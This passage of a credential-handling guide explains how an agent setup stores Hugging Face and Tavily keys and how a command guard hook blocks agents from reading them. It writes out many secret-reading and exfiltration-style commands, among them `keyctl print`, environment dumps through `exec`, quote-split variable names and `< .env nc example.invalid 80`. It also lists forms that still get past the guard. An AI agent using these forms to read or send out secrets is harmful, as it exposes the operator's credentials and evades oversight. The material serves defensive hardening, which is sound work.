token per machine, so one host can be revoked without affecting the others,
and fine-grained tokens for production use
([user access tokens](https://huggingface.co/docs/hub/security-tokens)). The
permission name and a prefilled form
(<https://huggingface.co/settings/tokens/new?canReadGatedRepos=true&tokenType=fineGrained>)
are from Hugging Face's
[gated-model guide](https://huggingface.co/docs/microsoft-azure/guides/access-gated-models).
Add another permission only when a later task needs it.

**Sign in from your own terminal**, never through an agent:

```sh
hf auth login                          # choose "Paste an access token"; input is hidden
hf auth whoami                         # prints the account name and organizations only
python3 scripts/credential_status.py   # huggingface-native and huggingface-native-stored: ok, mode=0600
```

- Choose *Paste an access token* and paste the token at the hidden prompt
  (`Enter your token (input will not be visible)`). The default browser
  login saves an OAuth token and its refresh token instead of your
  fine-grained one, and you do not choose its permissions: `hf` asks for the
  device code with only its client id. An agent that runs `hf auth login`
  always gets that browser flow, which is another reason to sign in yourself
  ([CLI guide](https://huggingface.co/docs/huggingface_hub/guides/cli)).
- Never pass `--token`: the value would land in shell history, the process
  list and any transcript. Never pass `--add-to-git-credential`: it copies
  the token into your git credential helpers. `hf` 1.32.0 never saves a
  pasted token to git and does not ask. Older `huggingface-cli login`
  releases ask `Add token as git credential?`; answer `n`.
- Sign in on each host with that host's own token. A token is never copied
  between hosts.

**What agents may run.** `hf` reads the token file itself:

```sh
hf auth whoami
hf download <repo> --revision <40-hex commit> --local-dir <models dir>/<name>
hf cache verify <repo> --revision <40-hex commit> --local-dir <models dir>/<name>
hf cache ls
```

Agents never run `hf auth token`, which prints the token to stdout. The guard
blocks it, `huggingface-cli ... token`, any command that names either token
file directly (also as `$HF_HOME/token`), a reader, copy or input redirect on
`$HF_TOKEN_PATH`, and a reader or copy of the whole Hugging Face home. The
deny rules keep the Read tool off both default paths. `hf auth list` shows the first three and last four
characters of each saved token. The guard does not block it, but an agent has
no need for it.

**Services and workers.**

- A model-serving unit serves from a pinned local directory (the
  `--local-dir` of a revision-pinned download above), never from a Hub id.
  New units set `Environment=HF_HUB_OFFLINE=1`, so a server built on
  `huggingface_hub`, such as vLLM, makes no Hub request at all. llama.cpp
  does not read that variable (build b11146, checked on 2026-09-25, has an
  `--offline` flag instead); give it a local `--model` file, and `--offline`
  where the build has it. No unit carries a token, and no `EnvironmentFile=`
  holds one.
- A worker that needs no gated or private repository sets
  `HF_HUB_DISABLE_IMPLICIT_TOKEN=1`, and one that downloads nothing also sets
  `HF_HUB_OFFLINE=1`. With the variable set, `huggingface_hub` 1.32.0 sends
  the token only when code passes it explicitly (`token=True` or a token
  string); implicit use — the default when calling code passes no `token`
  argument — is off for every call, writes included
  (`utils/_headers.py` `get_token_to_send`). This prevents accidental use of
  the token. It does not stop a deliberate read, because the worker runs as
  your user and can still read the file.
- A gated download happens in a signed-in run (your shell, or an agent
  running `hf download` as above). Serving then runs offline from the
  result.

**Rotate** by deleting or refreshing the token at
<https://huggingface.co/settings/tokens>, then run `hf auth logout` and
`hf auth login` again. Rotate at once if the value was printed anywhere, for
example by `hf auth token`, and follow
[Rotation and incidents](#rotation-and-incidents).

<a id="memory-only-option-linux-kernel-keyring-2026-09-26"></a>

## Kernel keyring: transport and per-boot spare (2026-09-29)

Until 2026-09-29 this section was "Memory-only option: Linux kernel keyring
(2026-09-26)": on 2026-09-26 the operator supplied a Tavily API key and
decided that it should be used without being stored in a file, so it lived
only here. Since 2026-09-29 no key of record lives only in the kernel keyring
([decision](decisions/2026-09-29-key-management.md)): a kernel restart erases
the keyring, and the user's instruction that day was that no key may be lost.
Every key's store of record is its `0600` file in the store, and the Tavily
key's is `<store>/tavily.env`.
[`scripts/kernel_keyring.py`](../scripts/kernel_keyring.py) stays, as a
transport that hands a key to one command at a time and as a per-boot spare
that lasts until the next kernel restart. `tvly-keyring` and the `exec` lines
below keep working with the Tavily copy until then.

**Moving a keyring-only key into the file store.** First the key's inventory
row becomes a `private_env_file`. Then one command copies the keyring value
into that new file, so the value never passes through an agent, a prompt or
a command line:

```sh
python3 scripts/kernel_keyring.py exec tavily_api_key TAVILY_API_KEY -- python3 -I -S tools/credentials/set_credential.py tavily --from-env
```

`exec` puts the one variable into the writer's environment. Then
`set_credential.py --from-env`:

- refuses unless the interpreter was started with `-I -S`. It checks
  `sys.flags.isolated` and `sys.flags.no_site` before anything else and
  never re-executes itself in this mode, because code that ran at start-up
  ran beside the value. `-I` ignores `PYTHONPATH`, the `PYTHON*` variables
  and the user site directory; `-S` also skips `site`, which runs the `.pth`
  lines of the interpreter's own `site-packages` even under `-I`, and on a
  uv-managed Python that directory sits in the home directory;
- stores only an entry that declares exactly one variable. A pair such as the
  Alpaca keys is refused, because its provenance cannot be proven from an
  inherited environment;
- takes the variable out of its own environment first, then refuses an
  absent, empty or out-of-grammar value by the same rules as the hidden
  prompt;
- is create-only. It refuses an existing file before it writes anything,
  and the finished temporary file gets its final name through `os.link`,
  which fails instead of replacing a file that appeared in between. There is
  no replace option: rotate with
  `tools/credentials/open_credential_terminal.sh tavily`;
- writes that temporary file as a dot-file, `.tavily.env.<16 hex>.tmp`. A
  kill before the link leaves it behind: the checker lists it by name as
  `undeclared_store_file`, and neither the checker nor the writer ever takes
  it for the stored key. The operator deletes it by hand;
- prints only `tavily: stored`, and no message holds the value.

Run it once, before the kernel restarts, from a checkout whose inventory
already lists the file: the writer reads the inventory beside it.
`scripts/credential_status.py` then reports the row `ok` ([Checker](#checker)).
New keys never go through the keyring: the operator types each one once with
`tools/credentials/open_credential_terminal.sh <inventory-id>`.

**Interim step (2026-09-29, until the id-based runner lands).** `tvly-keyring`
and the `exec` lines below read the keyring copy, not the file. After
rotating the Tavily key with `tools/credentials/open_credential_terminal.sh tavily`,
also refresh that copy in your own terminal with
`python3 scripts/kernel_keyring.py store --replace tavily_api_key`, or accept
that they keep the old key, which fails once it is revoked at Tavily, until
the next kernel restart drops the copy.

**Store a key in the keyring** in your own terminal, never through an agent.
Run `store` without a pipe: it turns echo off, prompts, and reads one pasted
line, so the value never passes through your shell, its history or a command
line:

```sh
python3 scripts/kernel_keyring.py store tavily_api_key     # paste at the hidden prompt, then press Enter
python3 scripts/kernel_keyring.py status tavily_api_key    # tavily_api_key: present
```

`store` also reads a value piped in from another program. Do not stage the
value in a shell variable while shell tracing is on: with `set -x`, bash
printed the expanded `printf %s "$K"`, value included, on stderr (measured
with a canary on 2026-09-26). Where the hidden prompt cannot turn echo off,
use a subshell that turns tracing off first; `K` ends with the subshell:

```sh
( set +x; read -rs K && printf %s "$K" | python3 scripts/kernel_keyring.py store tavily_api_key )
```

`read -rs` reads without echo, and `printf` is a shell builtin in bash and
zsh, so the value never appears in any process's arguments. `store` refuses
a name that is already stored; `--replace` revokes the old key and then
stores the new one, which is also how to rotate. It checks for an existing
key before the prompt and again after the value was read, under a lock that
`revoke` also takes, so two stores of one name that run at once cannot both
succeed without `--replace`. The lock is a Linux abstract socket name for
your uid, not a file. Names use lowercase letters, digits, `.`, `_` and `-`.

**Use it** through `exec`, which reads the key and starts the command with
one variable set, in that command's environment only. A stored key can also
be used through the key runner ([Using a key](#using-a-key-available-2026-09-29)),
which reads the file and masks the output; it is available, and becomes the
default path once the command guard models it. Until then `exec` stays the
documented path for the per-boot spare, which ends at the next kernel
restart:

```sh
python3 scripts/kernel_keyring.py exec tavily_api_key TAVILY_API_KEY -- tvly search "<query>" --json
python3 scripts/kernel_keyring.py revoke tavily_api_key    # remove it
```

Agents and workflow steps run the same line from the checkout root, so
nothing goes into a shell startup file, a unit file or a prompt. `exec` sets
only a credential variable: a name of the form `[A-Z_][A-Z0-9_]*` that ends
in `KEY`, `KEY_ID`, `TOKEN`, `SECRET`, `PASSWORD` or `PASSPHRASE`, such as
`TAVILY_API_KEY`, and does not start with `LD_`, `DYLD_` or `PYTHON`. A
program that reads a variable at startup can print its value in an error
message, even when the command itself prints nothing. Measured with a canary
on 2026-09-26: Python printed the values of `PYTHONWARNINGS`, `PYTHONHOME`
and `PYTHONIOENCODING`, bash printed `LC_ALL`, `tput` printed `TERM`, git
printed `GIT_TRACE`, and `PYTHONPYCACHEPREFIX` made Python create a directory
named after the value. The script never prints the value; its errors name
the key or an errno only. The command that `exec` starts can print it, so
give `exec` only commands that use the key without printing it.
[`adoption/tools/tvly-keyring`](../adoption/tools/tvly-keyring) is the same
`exec` for `tvly` alone, as an installed command:
`tvly-keyring search "<query>" --json`
([adoption/tools/README.md](../adoption/tools/README.md#tvly-keyring-2026-09-26)).
`scripts/credential_status.py` inspects files and never queries the keyring.
A `kernel_keyring` row, of which none remains since 2026-09-29, is listed as
`unchecked` with persistence `memory_only` and the warning
`memory_only_lost_on_restart`, and a required one is an inventory error.
Keys named `native-agent-stack:<name>` that no row declares, such as the
Alpaca spares and, until the restart, `tavily_api_key`, are listed by their
full name under `undeclared_keyring_key`. `status` is still the presence check for one
key. The Tavily commands are in [`recipes/tavily.md`](../recipes/tavily.md).

**Lifetime.** The key stays until it is revoked or the kernel stops. The
kernel keeps a user keyring for as long as its user namespace exists, whether
or not a process of that uid is running (upstream
`security/keys/process_keys.c`, `get_user_register()`; the user-keyring(7)
page in man-pages 6.19 still describes the older rule that tied it to running
processes), so a distribution stopping on its own does not erase it while
the VM runs. On WSL2 the kernel stops with `wsl --shutdown`, with a Windows
restart or update, and when WSL shuts the VM down after it has been idle for
`vmIdleTimeout` (default 60 seconds, Windows 11 only); a distribution itself
stops after it has been idle for `instanceIdleTimeout` (default 15 seconds)
([WSL configuration](https://learn.microsoft.com/en-us/windows/wsl/wsl-config),
updated 2026-09-16). After that, `status` prints `absent`, `exec` refuses to
start the command, and a spare must be stored again. The store file is not
affected.

**Scope.** The key is a `user` key named `native-agent-stack:<name>` in the
user keyring of one uid on one kernel, with permissions `0x3F0B0000`: all for
a process that possesses it; view, read and search for any process of the
same uid; nothing for anyone else. It is not shared with other hosts, and
each host stores its own. WSL2 runs every distribution on the same kernel.
This distribution runs in the kernel's initial user namespace (measured:
`readlink /proc/self/ns/user` gives `user:[4026531837]`), so another
distribution that also does would see the same user keyring for the same uid.
That was not measured across distributions.

**macOS** has no kernel keyring. The store file is the key of record there
too, typed once with `tools/credentials/open_credential_terminal.sh tavily`.
To run a command with the key there, the operator may use the login Keychain
through their own `secret` helper, as the Alpaca paper lane does
([`adaptive-paper/README.md`](../blueprints/us-equities/adaptive-paper/README.md)
and the 2026-09-25 addendum to
[`decisions/2026-09-22-broker-credential-handling.md`](decisions/2026-09-22-broker-credential-handling.md)):
`secret set TAVILY_API_KEY` once, then
`secret run TAVILY_API_KEY -- tvly search "<query>" --json`, which exports
the value only in that command's process. The helper is the operator's own
tool, not part of this repository, and this use for Tavily has not been run
on a Mac.

**What it does not protect against.**

- Any process of the same uid can read the key: `exec` with any command, a
  few lines of Python, or `keyctl print` where keyutils is installed. That
  includes every agent session running as you. The deny rules do not cover
  the keyring. When the key was first stored, the guard hook did not either:
  on 2026-09-26 its `check()` passed `keyctl print`, `keyctl pipe` and
  `keyctl read`, and every command given to `exec`, because it did not look
  past `exec ... --` and `TAVILY_API_KEY` was not one of its secret names.
  `exec tavily_api_key TAVILY_API_KEY -- env`, `-- printenv TAVILY_API_KEY`
  and `-- sh -c 'echo $TAVILY_API_KEY'` all passed, while a bare `env` or
  `printenv TAVILY_API_KEY` was blocked. A later change that day covers these
  forms ([Guard coverage](#guard-coverage-2026-09-26) below). The guard is
  still a text heuristic, so give `exec` only the commands in
  [`recipes/tavily.md`](../recipes/tavily.md).
  It is the residual risk the file store already has (see
  [the threat model](#threat-model-and-what-each-guard-stops)),
  without the file: nothing to commit, back up, sync or read through
  `\\wsl.localhost` from Windows. A Windows process can still start a command
  in the distribution as you with `wsl.exe`. Root can read the key too.
- While the command started by `exec` runs, its environment holds the value,
  readable by the same uid and root through `/proc/<pid>/environ`, as with
  the subshell pattern in [Picking up in a new session](#picking-up-in-a-new-session).
- Memory only does not mean no disk ever holds the value: the guest can swap
  a running command's memory, its environment included, to the WSL swap file
  (`swap`, default 25% of memory).
- A value that was pasted into a chat, a prompt or a tool call is already in
  the stores that keep output: Claude Code transcripts, ai-memory
  observations and the others under
  [Telemetry and pasted values](#telemetry-and-pasted-values). The keyring
  does not remove those copies. The Tavily key stored on 2026-09-26 arrived
  that way, and the operator accepted it for this practice use. If that exposure
  matters, rotate the key at Tavily, store the new value with
  `tools/credentials/open_credential_terminal.sh tavily` (type `replace` at
  the hidden prompt), and purge the copies as in
  [Rotation and incidents](#rotation-and-incidents).

**Checked on this host (2026-09-26, WSL2 kernel 6.18.33.2, x86_64).** These
are local integration checks, not an upstream test.
[`tests/test_kernel_keyring.py`](../tests/test_kernel_keyring.py) stores
generated throwaway values under names unique to each run and covers: the
store, status, exec and revoke round trip; that the child gets the value in
its environment and not on its command line; that no subcommand prints a test
value; `--replace`; two stores of one name at once, the first held at its
hidden prompt while the second completes (the first is then refused, or with
`--replace` revokes the second's key); `store` and `revoke` waiting while the
lock is held; refused names and variables, including the startup variables
above, with a positive control in which Python prints a `PYTHONWARNINGS`
value; hidden terminal input; and a session keyring that does not link the
user keyring (as with systemd `KeyringMode=private`). Such a session does not
possess keys in the user
keyring. `store` still sets the permissions there, because it creates the key
in its own process keyring and links it into the user keyring only
afterwards; `revoke` invalidates the key, because only a process that
possesses a key may revoke it. The first prototype of the script ignored the
permission call's result: in such a session its key kept the kernel default
(same uid: view only), and a later `exec` failed with `EACCES`. Run against
the script's first committed version, the race, lock and startup-variable
tests fail. The committed script finds the key stored on 2026-09-26:
`exec tavily_api_key TAVILY_API_KEY -- tvly auth --json` returned
`"authenticated": true, "method": "env"`, and `tvly auth --json` without
`exec` returned `"authenticated": false`, so this host holds no Tavily
credential file. Not run: another distribution, macOS, aarch64. CI runs the
tests where the keyring system calls are allowed and skips them otherwise.

### Guard coverage (2026-09-26)

A later change on 2026-09-26 extended
[`scripts/hooks/secret_path_guard.py`](../scripts/hooks/secret_path_guard.py)
to the keyring. It blocks, by reason code:

- `keyring_payload_read`: `keyctl print`, `pipe` and `read`, which output a
  payload, and `dh_compute`, which prints base ^ private (mod prime)
  computed from three keys' payloads; with a private key of 1 that is the
  base key's own payload (keyctl(1), keyutils Git as published on man7.org on
  2026-08-04). `keyctl list` and `rlist` read their target and print it as
  key IDs without checking that it is a keyring ("No attempt is made to
  check that the specified keyring is a keyring", keyctl(1)); on a `user` key
  they print its payload as integers (`act_keyctl_list` and
  `act_keyctl_rlist` in keyutils Git master, commit c076dff2, read
  2026-09-26). Both are blocked whatever the target: a first version allowed
  them on keyring targets, and a re-check found that a key serial written
  before a redirection (`keyctl rlist 123456789 </dev/null`) was read as the
  redirection's descriptor and passed. `kernel_keyring.py status` answers
  whether the key is present. `keyctl show` reads only keyrings and
  passes, as do `request`, `request2` and `prequest2`, which print only a
  key ID. keyctl accepts only the whole command name: its lookup skips every
  name longer than the word typed, although keyctl(1) says a shortening
  works. The same reason covers a payload read in inline interpreter
  code: `KEYCTL_READ`, `keyctl_read(`, `keyutils.read_key`, an import of
  `kernel_keyring`, a raw keyctl system call (250 on x86_64, 219 on
  aarch64) with operation 11, or `keyctl print` (or `list`/`rlist` on
  anything but those keyrings) run as a subprocess. That
  check runs only when the command starts an interpreter, so a code search
  or a commit message that names `KEYCTL_READ` passes.
- Every existing rule, applied to the command that `kernel_keyring.py exec`
  (any path to the script, any launcher such as `python3 -I` or
  `uv run python`) or `tvly-keyring` starts. `-- cat .env` is a
  `dotenv_read`, `-- strace ...` a `process_trace`, and so on. A launcher's
  own options are read as getopt reads them, from each tool's `--help`
  (`stdbuf -o0`, `nice -n 5`, `timeout -s KILL 5`, `xargs -I {}`,
  `sudo -iu root`), and an output redirection before a command
  (`> out tvly auth`) does not hide it.
- `keyring_variable_reference`: any mention of the injected variable except
  the `<ENV_VAR>` argument of `exec` itself, whether in the started command,
  in code piped into it or in a here-document. The guard exempts that
  argument's own place in the command after quote removal, so an argument
  split by quotes, a backslash or a line continuation (`KK_DEMO_TO"KEN"`)
  cannot use up the exemption that a reference then hides behind. A variable outside the guard's secret
  names counts too. `TAVILY_API_KEY` is now one of those names, so
  `$TAVILY_API_KEY` anywhere is a `secret_variable_reference`.
- `environment_dump_in_keyring_exec`: the started command dumps the
  environment it inherits: `env`, `printenv`, `set`, `export -p`,
  `declare -p`, `ps e` or `ps -E` (also inside `sh -c`); the same, or a shell, an
  interpreter, awk or jq, as another program's argument, which the guard
  reads as a command from there on, since that is how a launcher it does not
  model (`find -exec`, `watch`, `flock`, `taskset`, GNU `time -f`) runs it;
  a shell's `${!...}`
  indirection; or code that reads the whole environment (`os.environ`,
  `environb`, `getenv`, `process.env`, `Deno.env`, `%ENV`, a bare `ENV`,
  `$_ENV`, PowerShell's `env:`, awk's `ENVIRON`, jq's `env`, or a quoted
  `env`, `printenv`, `set` or `export` handed to a subprocess). The code
  check runs only when the started command runs an interpreter, awk or jq,
  so a `tvly search` whose query mentions `os.environ` passes. The price of
  the argument rule: a one-word query `env` or `printenv` is blocked, and so
  is `set`, `export`, `declare` or `typeset` as the command's last word
  (`tvly search set --json` passes).
  `/proc/*/environ` stays a `process_environment` everywhere.
- `native_token_print`: `tvly auth` without `--json`, which prints the key's
  first eight and last four characters (tavily-cli 0.1.8
  `commands/auth.py`). A redirection's target or a here-document delimiter
  is not the flag: `tvly auth > --json` prints them into a file named
  `--json`. `native_store_path`: `~/.tavily/config.json`, where
  `tvly login` and `tvly init` store a key or an OAuth token.

Every text rule of the guard also reads the command after the shell's quote
removal, with each backslash-newline joined first, so
`sh -c 'echo $GH_TO''KEN'`, whose inner shell runs `echo $GH_TOKEN`, is a
`secret_variable_reference`. A cross-family review the same day found the
split exec argument, `stdbuf -o0` before an interpreter, `keyctl rlist` on
a user key and `tvly auth > --json` passing the first version of these
rules. Each was reproduced against that version before the fix and is now a
regression case in `tests/test_secret_path_guard.py`. A GPT-6 re-check of the
repair found four more, each reproduced and fixed the same day:
`"$KK_DEMO_TOKEN"x`, which quote removal had merged into another name (both the
written and the unquoted text are now read); a key serial before a redirection
(list and rlist are now blocked outright); bash's named descriptor
(`tvly auth {fd}>--json`, now parsed as a redirection); and a false block of a
search query `export` followed by `--max-results` (declare/export flags are now
short options only).

The documented `store`, `status`, `revoke` and `exec ... -- tvly ...` forms
pass, and `tests/test_secret_path_guard.py` checks every keyring command in
the fenced blocks of this page, `recipes/tavily.md` and
`adoption/tools/README.md`. These still pass, recorded in that test's
`EXPECTED_PASS_THROUGH`: a shell or interpreter that `exec` starts and that
reads its commands from a pipe or a script file; a copy of
`kernel_keyring.py` under another name; a keyctl system call whose
number is held in a variable; a variable name that the started command
assembles at run time; a launcher that takes its command as one string
(`script -c`); and, outside a keyring exec, a reader behind a launcher the
guard does not model (`watch -n 5 cat .env`). The macOS
`secret run NAME -- command` form is not unwrapped. A host runs the new rules only after its user-level copy
is replaced (`tools/adoption/install_claude_profile.py --only guard`, see
[User-level guards](#user-level-guards-deployed-by-the-claude-profile)).

### Launchers, substitutions and manager environments (2026-09-29)

This subsection records K3's 2026-09-29/30 implementation and acceptance history; its measurements are retained,
not presented as new K4 runs. A coverage review found command forms it read too little of, and repair rounds fixed
what independent reviews found. K3 withdrew its earlier `ps` loosening and kept both its current and c26800f3 word
readings. Its tests retain every earlier row except two `systemd-run` gaps that moved from `EXPECTED_PASS_THROUGH`
to `BLOCKED`. K4 preserves that history but has one precisely bounded exception to body-as-shell reading, form F
in the K4 subsection below. Outside F both base readings and every old refusal reason remain. The guard remains a
text heuristic, not a shell parser; the recorded limits below apply subject to the explicit K4 changes.

- **systemd's launchers are modelled: `systemd-run`, `run0`, `systemd-inhibit`, `systemd-cat`.** Each one's own options
  are skipped as getopt reads them, redirections between them included (`systemd-run --user 2>/tmp/log --pipe printenv`),
  and the command it starts gets every rule, a nested `bash -ic '...'` string too. The option tables come from upstream:
  `src/run/run.c` at systemd v255 for `systemd-run` (getopt string `+hrH:M:E:p:tPqGdSu:`), with the value options of later
  releases listed so a newer host's command is still found (`--capsule`/`-C` and `--background` from v256, `--json` from
  v257, `--job-mode` from v258, `--root-directory` from v259 and `--output` from v261, each read in `run.c` at that tag);
  `parse_argv_sudo_mode` in `run.c` at v256 to v262 for `run0`; `src/login/inhibit.c` and `src/journal/cat.c` for
  `systemd-inhibit` and `systemd-cat`. What a launcher prints goes to the caller with `systemd-run --pipe` (`--wait`
  shows terse unit information, and without either the output goes to the journal, `systemd-run(1)` 255), and
  `systemd-cat` writes it to the journal, so `systemd-run --user --pipe --wait cat "$PAPER_ENV_FILE"` is a
  `credential_file_read`, `... printenv` and `systemd-cat printenv` an `environment_dump`. The trading lane's loader path
  (`systemd-run --user --unit=X --collect /bin/bash -ic 'exec python3 runner.py run --env-file "$PAPER_ENV_FILE_2"'`)
  still passes for both accounts. A secret variable name (any name in the guard's list), with or without a value, set
  through `systemd-run`'s `-E`/`--setenv` or `-p Environment=...` is a `secret_variable_on_command_line`. Where the value
  goes differs by form (systemd v255, read 2026-09-29). `-E NAME=value` puts the value in the command line of the
  `systemd-run` process itself (its argv: `/proc/PID/cmdline` and the process listing show it while `systemd-run` runs) and
  in the transient unit's `Environment` property. `-E NAME` puts only the name in argv, and `systemd-run` takes the
  caller's own value from its environment (`strv_env_replace_strdup_passthrough`, `src/basic/env-util.c:417`, called for
  `case 'E'`, `src/run/run.c:348`): that value reaches the unit's `Environment` property and no argv. The property is
  appended to the start message over the user bus (`arg_environment`, `run.c:853-866`), which `systemctl --user show -p
  Environment UNIT` and any bus client read. Not the journal, as an earlier version of this page said: the unit's
  description, which the manager logs as `Started <unit> - <description>`, defaults to the started command and its
  arguments after the options (`quote_command_line(arg_cmdline)`, `run.c:1940-1951`), so `-E NAME=value` and `-E NAME`
  are not in it, while a value written after the command is (`systemd-run --user /bin/true APCA_API_SECRET_KEY=abc`, a
  recorded gap). Only the variable's name is read (`-E LABEL=APCA_API_KEY_ID` sets `LABEL`).
- **Command substitution inside double quotes is read.** The shell runs `$(...)` and a backquote pair inside a
  double-quoted word (Bash Reference Manual, "Command Substitution": `$` and the backquote keep their meaning inside
  double quotes), so `echo "$(printenv)"` dumps the environment, yet only the unquoted form was read. The body is now
  read as a command line, to 32 levels of nesting, so `echo "$(printenv)"`, `x="$(printenv)"; echo "$x"` and
  `git commit -m "$(cat "$PAPER_ENV_FILE")"` are blocked as their unquoted forms are, with the limits of the reading of a
  command line that this subsection lists (a `#` comment, `$(< FILE)`, a launcher or an option spelling the tables do not
  know). Single-quoted text and a backslash-escaped `\$(` or backquote stay data (`echo '$(printenv)'` and
  `echo "\$(printenv)"` pass). `$(< FILE)`, bash's shorthand for `$(cat FILE)`, reads its file like `cat` (a segment that
  is only `< FILE` does, since zsh's `< FILE` alone shows the file too), a leading `< FILE cmd` is read as `cmd < FILE`
  (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
  A backquote inside a single-quoted string is text for the shell that string is handed to, so
  `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
- **K3 here-document history; K4 exempts only form F below.** Outside that exact top-level Python/Node form,
  a here-document's lines retain both base shell readings. Data/prose bodies and rejected F forms remain command lines,
  and a
  `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed by
  `value: "$(printenv)"` and `EOF` is an `environment_dump`, quoted delimiter or not, and so is
  `git commit -m "$(cat <<'EOF' ... EOF)"` when a line of its prose reads as a dump. The guard read them specially for a
  time, and two independent verification reviews (of 172596ed and of 50ca6ca2, 2026-09-29) found that every such reading
  needs bash-exact parsing and that each slip hid executable text. The general reading (a quoted delimiter made the body
  data inside a double-quoted substitution) let `eval "$(cat <<'EOF' ... EOF)"` and `bash -c "$(...)"` through and lost
  text to an ANSI-C delimiter (`<<$'EOF'`), a backslash-newline that joined a body line to its terminator, an arithmetic
  command such as `((1 << "2"))` and a quoted `#`. Its replacement, one exemption for a strict canonical idiom behind `git`,
  `gh`, `echo` and `printf`, let six more through: an idiom head inside another here-document's body that swallowed its
  terminator, an idiom inside an unquoted here-document that a shell reads, an `echo` piped into `sh`,
  `git rebase --exec`, a case pattern's `)` that closed a substitution early, and a process substitution that runs a
  shell. Both readings are gone. What a substitution prints is code for a shell, `eval`, an interpreter, `source`, `xargs`,
  `ssh` and `git rebase --exec`, a file name for a reader, and only text for `git commit -m`; telling those apart from
  the words of one command line is what failed twice. K4 therefore keeps the base reading for data consumers,
  substitution idioms and every body outside F. The cost is friction, in the strict direction. A commit message or
  pull-request body written through `"$(cat <<'EOF' ... EOF)"` is refused when a line of its prose starts with
  `printenv` or `env` or holds `printenv` in backquotes (behind `git`, `gh`, `echo` and `printf` too), a literal
  `$(printenv)` example inside a quoted here-document is refused in file-writing (`cat > note.md <<'EOF'`), Python
  (`python3 <<'PY'`), commit-message (`git commit -F - <<'EOF'`) and pull-request-comment
  (`gh pr comment --body-file - <<'EOF'`) workflows, and Python's `set()` after a comment line in an interpreter's
  here-document (`# unique values` and then `print(len(set([1, 1])))`) was refused by K3 as the shell's `set`.
  K4 allows that benign body only when the entire command qualifies as F; rejected forms retain the refusal.
  For refused data bodies and substitution idioms, write the text with the Write tool and pass the path: `git commit -F FILE`, `gh pr create --body-file FILE`, a script file for the
  interpreter. Measured 2026-09-29 with the guard of 752def7f: of the 2,015 distinct commit messages on all refs of this
  repository then (`git log --all`, a count that grows), in the `git commit -m` and `gh pr create --body` patterns, this
  guard refuses 36 and the base guard 16, and none that the base guard refuses passes; the five real messages that `tests/test_secret_path_guard.py`
  records (`REAL_COMMIT_MESSAGES`) are among them. Residual gaps, each an inert string in `EXPECTED_PASS_THROUGH`: an
  unquoted here-document that expands `$(...)` between single quotes (`cat <<EOF` with `'$(printenv)'` in its body),
  which the base guard passed too.
- **A `#` comment hides only its own line, and only where a word starts.** The tokenizer joins the lines of a command
  with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a comment, so a `#` dropped the whole
  rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv` and
  `gh api repos/o/r/issues/1#c; cat "$PAPER_ENV_FILE"` all passed, as did every command after a `## Summary` heading. A
  comment is now removed only from a `#` that starts a word, outside quotes and double-quoted substitutions, to the end
  of its line (Bash Reference Manual, "Comments"), and the guard keeps its earlier reading of the same command besides,
  so nothing it read before is dropped (up to 200,000 characters: tokenizing costs about 9 microseconds a character inside
  quotes, and two readings of an 840 KB message took 17.8 s against a 10 s hook timeout, one reading 8.9 s). Inside a
  `$(...)` body a comment also runs to the end of its line (`echo "$(date # )` newline `printenv` newline `)"` runs
  printenv). In a here-document body a comment likewise hides only its own line: the lines of a script written through a
  here-document are read as commands, which the `#!` line of the script hid for a time. What this newly blocks, measured on
  this repository (2026-09-29): 4 of its 201 shell scripts when written through a here-document (their array literals
  `X=(env HOME=...)`, which the guard reads as an `env` with no command), one of 785 fenced blocks (a python
  `len(set(found))`) and none of 4,338 fenced lines; the same array literals and python `set(...)` were always read as
  commands when a whole script is passed as one command string.
- **ANSI-C strings are data.** `$'...'` runs to the first `'` that a backslash does not escape, so
  `printf '%s' $'it\'s "$("printenv")"'` holds no substitution and passes; inside double quotes `$'` is no such string.
  shlex knows no ANSI-C quoting (it read `$'it\'s #\nprintenv\n'` as a word, a quote that opens and a comment, and the
  harmless text was refused), so the tokenizer keeps each such string as one word of the same text, its `\'` written as a
  quote shlex reads: `printf '%s' $'it\'s #\nprintenv\n'` passes and `bash -c $'printenv'` is read as `bash -c printenv`.
  Escapes such as `\n` and `\x..` are not decoded.
- **Arithmetic expansion is no command.** `$((` opens an arithmetic expansion only when a `))` that touches closes it:
  `env=2; echo "$((env))"` reads the variable `env` and a `<<` in it is a shift, so both pass, while a real substitution
  inside it (`$(( $(printenv | wc -l) + 1 ))`) is still read and `$((printenv) )`, whose parentheses do not touch, is a
  substitution holding a subshell, as bash reads it.
- **`ps` prints the environment on two hosts, and the guard reads a command line as both (2026-09-29).** macOS `ps`
  documents `-E` as "Display the environment as well" and lists the BSD-style `e` as "Same as -E" (Apple `adv_cmds`
  `ps.1`, read 2026-09-29), and procps-ng `ps` (Linux, 4.0.4 here) documents the BSD-style `e` as "Show the environment
  after the command" and has no `-E`. The guard blocks, as an `environment_dump`, a dashless cluster with `e` or `E`
  (`ps eww`, `ps auxe`, `ps Eww`, `ps auxE`) and `-E` alone or in a cluster before the first letter that takes a value
  (`ps -Ewwp 123`, `ps -p 123 -E`, `ps -A -E`). Both hosts read a dashed word as a cluster of option letters, and a letter
  that takes a value takes the rest of the word or, when it ends the cluster, the next word: `-o`, `-O`, `-p`, `-u`,
  `-U`, `-g`, `-G`, `-t` on both, `-C`, `-q` and `-s` on procps. So that next word is a value and no cluster of flags in
  each host's default reading: `ps -u Eve`, `ps -fu Eve` and `ps -uEve` pass. The guard reads a third way besides, the base
  guard's (2026-09-30): procps has personalities, `PS_PERSONALITY=old` or `I_WANT_A_BROKEN_PS` set on the command line or
  inherited from the shell (which a hook cannot see), under which `ps -axu e` is parsed BSD-style, `u` takes no value and
  `e` shows the environment (third verification review, from the procps-ng 4.0.4 manual and `/usr/bin/ps`). So a dashless
  word of the base guard's cluster alphabet with an `e` is refused after any cluster, as the base guard refused it: `ps -fu
  steve`, `ps -fu eve`, `ps -fo user`, `ps -ft e`, `ps -fU steve` and `ps -fC e` are an `environment_dump`, which an earlier
  round of this work had let through. A stand-alone value option still takes the next word (`ps -u steve` and `ps -C
  emacs` pass, as with the base guard; whether a personality reads a stand-alone `-u` BSD-style too is not measured here).
  The forms that pass whatever the user name are a numeric id (`ps -f -U 1000`, `ps -fU 1000`) and `pgrep`
  (`pgrep -a -u steve node`), each checked against the guard of this change. `ps -ef`, `ps -o pid,command -p N` and
